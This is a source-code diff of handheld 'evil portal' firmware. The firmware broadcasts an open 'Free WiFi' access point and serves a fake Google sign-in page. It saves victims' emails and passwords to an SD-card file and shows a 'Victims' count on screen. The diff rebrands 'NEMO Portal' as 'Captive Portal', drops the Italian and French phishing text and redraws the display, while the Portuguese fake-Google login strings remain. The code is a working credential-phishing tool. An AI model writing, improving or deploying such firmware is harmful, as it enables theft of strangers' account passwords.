@@ -3,8 +3,8 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "NEMO Free WiFi"
-#define SD_CREDS_PATH "/nemo-portal-creds.txt"
+#define DEFAULT_AP_SSID_NAME "Free WiFi"
+#define SD_CREDS_PATH "/portal-creds.txt"
 
 
 #if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
@@ -29,24 +29,6 @@
 #define LOGIN_BUTTON "Avançar"
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
-#elif defined(LANGUAGE_IT_IT)
-#define LOGIN_TITLE "Accedi"
-#define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
-#define LOGIN_EMAIL_PLACEHOLDER "Email"
-#define LOGIN_PASSWORD_PLACEHOLDER "Password"
-#define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
-#define LOGIN_BUTTON "Avanti"
-#define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
-#define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
-#elif defined(LANGUAGE_FR_FR)
-#define LOGIN_TITLE "Connexion"
-#define LOGIN_SUBTITLE "Utiliser votre compte Google"
-#define LOGIN_EMAIL_PLACEHOLDER "Adresse e-mail"
-#define LOGIN_PASSWORD_PLACEHOLDER "Mot de passe"
-#define LOGIN_MESSAGE "Merci de vous connecter pour obtenir une navigation sécurisée."
-#define LOGIN_BUTTON "Suivant"
-#define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
-#define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
@@ -76,19 +58,26 @@ void setSSID(String ssid){
   return;
 }
 
-#ifdef CARDPUTER
+#if defined(CARDPUTER)
 void confirmOrTypeSSID(){
   DISPLAY.fillScreen(BG_COLOR);
-  DISPLAY.setSwapBytes(true);
   DISPLAY.setTextSize(MEDIUM_TEXT);
-  DISPLAY.setTextColor(BG_COLOR, MAIN_COLOR);
-  DISPLAY.setCursor(0, 0);
-  DISPLAY.println("  WiFi SSID  ");
-  DISPLAY.setTextSize(SMALL_TEXT);
-  DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+  DISPLAY.setTextColor(BG_COLOR);
+
+  DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+  DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+  DISPLAY.drawString("WiFi SSID", DISPLAY_CENTER_X, 20);
+
+  DISPLAY.setTextSize(1.5);
+  DISPLAY.setTextColor(MAIN_COLOR);
+
+  DISPLAY.setCursor(0, 50);
   DISPLAY.println(TYPE_SSID_TEXT);
-  DISPLAY.setTextSize(SMALL_TEXT);
-  uint8_t ssidTextCursorY = DISPLAY.getCursorY();
+
+  DISPLAY.setTextSize(1.5);
+
+  uint8_t ssidTextCursorY = DISPLAY.getCursorY() - 20;
+  DISPLAY.setCursor(0, ssidTextCursorY);
   String currentSSID = String(apSsidName.c_str());
   DISPLAY.printf("%s", currentSSID.c_str());
   bool ssid_ok = false;
@@ -111,7 +100,7 @@ void confirmOrTypeSSID(){
           currentSSID += i;
         }
       }
-      DISPLAY.fillRect(0, ssidTextCursorY, DISPLAY.width(), DISPLAY.width()- ssidTextCursorY, BLACK);
+      DISPLAY.fillRect(0, ssidTextCursorY - 10 , DISPLAY.width(), DISPLAY.width() - ssidTextCursorY, BLACK);
       DISPLAY.setCursor(0, ssidTextCursorY);
       DISPLAY.printf("%s", currentSSID.c_str());
     }
@@ -159,21 +148,30 @@ void getSSID(){
 
 void printHomeToScreen() {
   DISPLAY.fillScreen(BG_COLOR);
-  DISPLAY.setSwapBytes(true);
   DISPLAY.setTextSize(MEDIUM_TEXT);
-  DISPLAY.setTextColor(BG_COLOR, MAIN_COLOR);
-  DISPLAY.setCursor(0, 0);
-  DISPLAY.println(" NEMO PORTAL ");
-  DISPLAY.setTextSize(SMALL_TEXT);
-  DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
-  DISPLAY.printf("%s\n\n",apSsidName.c_str());
-  DISPLAY.print("WiFi IP: ");
-  DISPLAY.println(AP_GATEWAY);
-  DISPLAY.println("Paths: /creds /ssid");
+
+  DISPLAY.fillRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+  DISPLAY.drawRoundRect(5, 4, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+
+  DISPLAY.setTextColor(BG_COLOR);
+  DISPLAY.drawString("CAPTIVE PORTAL", DISPLAY_CENTER_X, 20);
+
+  DISPLAY.setTextSize(1.5);
+  DISPLAY.setTextColor(MAIN_COLOR);
+  DISPLAY.drawString(apSsidName, DISPLAY_CENTER_X, 50);
+  String gateway = WiFi.softAPIP().toString();
+  DISPLAY.drawString("WiFi IP: " + gateway, DISPLAY_CENTER_X, 65);
+  DISPLAY.drawString("Paths: /creds /ssid", DISPLAY_CENTER_X, 80);
   DISPLAY.setTextSize(MEDIUM_TEXT);
-  DISPLAY.setTextColor(BG_COLOR, MAIN_COLOR);
-  DISPLAY.printf("Victims: %-4d\n", totalCapturedCredentials);
-  DISPLAY.setTextColor(MAIN_COLOR, BG_COLOR);
+  DISPLAY.setTextColor(BG_COLOR);
+
+  DISPLAY.fillRoundRect(5, 100, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+  DISPLAY.drawRoundRect(5, 100, DISPLAY.width() - 10, 30, 10, MAIN_COLOR);
+
+  String totalCapturedCredentialsText = "Victims: " + String(totalCapturedCredentials);
+  DISPLAY.drawString(totalCapturedCredentialsText, DISPLAY_CENTER_X, 115);
+  
+  DISPLAY.setTextColor(MAIN_COLOR);
 }
 
 String getInputValue(String argName) {
@@ -241,7 +239,7 @@ String index_POST() {
 }
 
 String ssid_GET() {
-  return getHtmlContents("<p>Set a new SSID for NEMO Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
+  return getHtmlContents("<p>Set a new SSID for Captive Portal:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
 }
 
 String ssid_POST() {
@@ -249,7 +247,7 @@ String ssid_POST() {
   Serial.println("SSID Has been changed to " + ssid);
   setSSID(ssid);
   printHomeToScreen();
-  return getHtmlContents("NEMO Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
+  return getHtmlContents("Captive Portal shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
 }
 
 String clear_GET() {
